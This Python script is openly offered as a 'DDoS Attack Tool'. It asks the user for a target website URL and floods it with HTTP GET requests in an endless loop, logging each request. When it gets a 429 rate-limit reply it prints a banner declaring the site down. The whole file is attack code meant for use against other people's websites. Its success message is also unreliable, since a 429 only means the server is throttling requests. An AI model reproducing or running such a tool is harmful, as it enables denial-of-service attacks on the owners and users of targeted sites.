'''
MIT License
Copyright (c) 2022 Ahad 
If you want to use this code for any purpose, kindly give credits before using. 
You can modify or edit it but you are not allowed to remove the author name 
from the code.
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

import httpx
from colorama import Fore, Style

yellow = Fore.YELLOW
blue = Fore.BLUE
red = Fore.RED
resetStyle = Style.RESET_ALL
bright = Style.BRIGHT
title = f"[{yellow}{bright}DDoS Attack{resetStyle}]"
count = 0

class DDoS_Tool():
    def Ahad():
        print(f'''{red}{bright}
╔╦╗╔╦╗┌─┐╔═╗  ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔╦╗┌─┐┌─┐┬  
 ║║ ║║│ │╚═╗  ╠═╣ │  │ ├─┤│  ├┴┐   ║ │ ││ ││  
═╩╝═╩╝└─┘╚═╝  ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴   ╩ └─┘└─┘┴─┘
{resetStyle}''')
        
        print(f'''{yellow}
Author: Ahad#3257                           
Website: https://itscruel.cf
Github: https://github.com/CruelDev69/DDoS-Attacker
{resetStyle}''')

    def DDoS():
     global count
     client = httpx.Client()
     url = str(input(f"{title}{blue} Enter your website URL: {resetStyle}"))
     while True:
        try:
            statusCode = client.get(url)
            count += 1
            print(f"{title}{blue} Information: \nTarget: {url}\nRequest no: {count}\nWebsite Status: {statusCode.status_code}{resetStyle}")
            with open("logs.txt", "a") as f:
                f.write(f"[DDos Attack] Information: \nTarget: {url}\nRequest no: {count}\nWebsite Status: {statusCode.status_code}\n")
        except:
            continue
        if statusCode.status_code == 429:
            print((f'''{yellow}
|-----------------------------------------------------------------------|
|                ╦ ╦┌─┐┌┐ ┌─┐┬┌┬┐┌─┐  ╔╦╗┌─┐┬ ┬┌┐┌                      |
|                ║║║├┤ ├┴┐└─┐│ │ ├┤    ║║│ │││││││                      |
|                ╚╩╝└─┘└─┘└─┘┴ ┴ └─┘  ═╩╝└─┘└┴┘┘└┘                      |
|-----------------|-----------------------------------------------------|
| Target          | {url}                                               |
| Status Code     | {statusCode.status_code}                            |
| Requests title   | {count}                                             |
|-----------------|-----------------------------------------------------|
{resetStyle}'''))
            with open("logs.txt", "a") as f:
                f.write(f'''
|-----------------------------------------------------------------------|
|                ╦ ╦┌─┐┌┐ ┌─┐┬┌┬┐┌─┐  ╔╦╗┌─┐┬ ┬┌┐┌                      |
|                ║║║├┤ ├┴┐└─┐│ │ ├┤    ║║│ │││││││                      |
|                ╚╩╝└─┘└─┘└─┘┴ ┴ └─┘  ═╩╝└─┘└┴┘┘└┘                      |
|-----------------|-----------------------------------------------------|
| Target          | {url}                                               |
| Status Code     | {statusCode.status_code}                            |
| Requests title   | {count}                                             |
|-----------------|-----------------------------------------------------|
''')
            return False


if __name__ == "__main__":
    DDoS_Tool.Ahad()
    DDoS_Tool.DDoS()